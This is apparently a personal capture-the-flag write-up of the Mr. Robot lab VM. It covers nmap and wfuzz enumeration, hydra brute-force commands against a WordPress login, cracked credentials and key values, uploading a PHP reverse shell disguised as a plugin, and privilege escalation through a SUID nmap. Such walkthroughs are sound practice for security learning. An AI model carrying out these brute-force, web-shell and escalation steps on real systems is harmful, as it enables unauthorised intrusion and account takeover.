```
IP=192.168.56.101
```
## Nmap Results
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/mr-robot]
└─$ nmap -A -sV -sT -p- 192.168.56.101 -oA mr-robot
PORT    STATE  SERVICE  VERSION
<font color=red>22</font>/tcp  closed ssh
<font color=red>80</font>/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
<font color=red>443</font>/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
</pre>

## Wfuzz Results
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/mr-robot]
└─$ wfuzz -c -z file,/opt/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://192.168.56.101/FUZZ"
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   301        0 L      0 W        0 Ch        "index.php"
000000036:   200        52 L     158 W      2678 Ch     "<font color=red>wp-login.php</font>"
000000057:   301        0 L      0 W        0 Ch        "wp-register.php"
000000069:   200        30 L     98 W       1188 Ch     "index.html"
000000110:   200        0 L      0 W        0 Ch        "favicon.ico"
000000130:   200        1 L      14 W       64 Ch       "readme.html"
000000206:   200        156 L    27 W       309 Ch      "license.txt"
000000248:   200        3 L      4 W        41 Ch       "<font color=red>robots.txt</font>"
000000262:   301        0 L      0 W        0 Ch        "wp-commentsrss2.php"
000000263:   200        0 L      0 W        0 Ch        "wp-config.php"
000000270:   200        0 L      0 W        0 Ch        "sitemap.xml"
000000395:   301        0 L      0 W        0 Ch        "wp-rss.php"
000000397:   301        0 L      0 W        0 Ch        "wp-rss2.php"
000000416:   301        0 L      0 W        0 Ch        "wp-rdf.php"
000000413:   200        0 L      0 W        0 Ch        "wp-cron.php"
000000438:   301        0 L      0 W        0 Ch        "wp-atom.php"
000000443:   301        0 L      0 W        0 Ch        "wp-feed.php"
000000462:   200        10 L     22 W       227 Ch      "wp-links-opml.php"
000000642:   200        0 L      0 W        0 Ch        "sitemap.xml.gz"
000000838:   200        0 L      0 W        0 Ch        "wp-load.php"
000001073:   302        0 L      0 W        0 Ch        "wp-signup.php"
000001507:   302        0 L      0 W        0 Ch        "wp-activate.php"
</pre>

## Key 1/3
`robots.txt` redirect us to two files, which are a dictionary file and the first key.

![](../Assets/images/mr-robot/Pasted%20image%2020220801124803.png)

![](../Assets/images/mr-robot/Pasted%20image%2020220801124818.png)

## Key 2/3
### Password Cracking
`wfuzz` gives us a couple of interesting files such as `wp-login.php` which is 
 a wordpress login page.

![](../Assets/images/mr-robot/Pasted%20image%2020220801125616.png)

There are others like `wp-register.php` or `wp-signup.php` but those seem inaccessible. So we'll focus on the login page.

An interesting note here is that the page gives us an error message when we try to login with an invalid username or password. This means we can enumerate the username and password separately.

![](../Assets/images/mr-robot/Pasted%20image%2020220801125905.png)

We're going to use the previous dictionary file.

The file is very big, more than 850 thousand lines. 
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/mr-robot]
└─$ wc -l fsocity.dic
858160 fsocity.dic
</pre>
The content of the file has many duplication, we can eliminate those to reduce the size.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/mr-robot]
└─$ sort -u fsocity.dic -o fsocity.dic
</pre>
A dictionary attack is then performed with `hydra`. 

```
hydra -L fsocity.dic -p password 192.168.56.101 http-post-form "/wp-login.php:log=^USER^&pwd=password&wp-submit=Log In:F=Invalid username"
```
Note: The 'F:Invalid username' option is to indicate failure.

![](../Assets/images/mr-robot/Pasted%20image%2020220801164850.png)

Runing the command above yielded three matches. 

![](../Assets/images/mr-robot/Pasted%20image%2020220801162109.png)

We now pass the dictionary file as password with username `elliot`.

```
hydra -l elliot -P test 192.168.56.101 http-post-form "/wp-login.php:log=elliot&pwd=^PASS^&wp-submit=Log In:F=incorrect"
```
![](../Assets/images/mr-robot/Pasted%20image%2020220801164838.png)
![](../Assets/images/mr-robot/Pasted%20image%2020220801165505.png)

Using the new found credential, 
```
elliot:ER28-0652
```

we're successfuly logged in as admin.

![](../Assets/images/mr-robot/Pasted%20image%2020220802105021.png)

### RCE through plugin
As admin, we have the ability to install plug-in, which is just a php code. This mean we can upload a reverse shell, disguise it as plugin and it'll run on the website.

I'm using this [reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) and in order for wordpress to recognize the php file as plug in, we need to add this header:
```
/**
 * Plugin Name: YOUR PLUGIN NAME
 */
```
https://developer.wordpress.org/plugins/plugin-basics/header-requirements/

Now we need to zip the reverse shell,
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/mr-robot]
└─$ zip revshell.zip revshell.php
  adding: revshell.php (deflated 59%)
</pre>
and upload it to the webserver.

![](../Assets/images/mr-robot/Pasted%20image%2020220802111207.png)

![](../Assets/images/mr-robot/Pasted%20image%2020220802190616.png)

![](../Assets/images/mr-robot/Pasted%20image%2020220802190655.png)

## Post Exploitation
The home directory has a single folder `robot` that contains the user's password and the second key. The latter is only accessible by the user `robot`.
<pre style="font-size: 12px";>
daemon@linux:~$ cd /home/
daemon@linux:/home$ ls
robot
daemon@linux:/home$ cd robot/
daemon@linux:/home/robot$ ls -l
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
</pre>

Simply putting the md5 password to [crackstation](https://crackstation.net/)returned the original string.

![](../Assets/images/mr-robot/Pasted%20image%2020220802191051.png)

```
robot:abcdefghijklmnopqrstuvwxyz
```

<pre style="font-size: 12px";>
daemon@linux:/home/robot$ su robot
Password:
robot@linux:~$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
</pre>

## Key 3/3
### Privelege Escalation with SUID
Enumerating SUID, I find that `nmap` is available. 
<pre style="font-size: 12px";>
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
<font color=red>/usr/local/bin/nmap</font>
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
</pre>

`Nmap` has interactive mode between versions 2.02 to 5.21 which, if available, we can spawn a root shell from.

![](../Assets/images/mr-robot/Pasted%20image%2020220802193347.png)

## Resources
1. [Hydra notes for bruteforcing](https://github.com/gnebbia/hydra_notes)
2. https://linuxconfig.org/test-wordpress-logins-with-hydra-on-kali-linux
3. https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress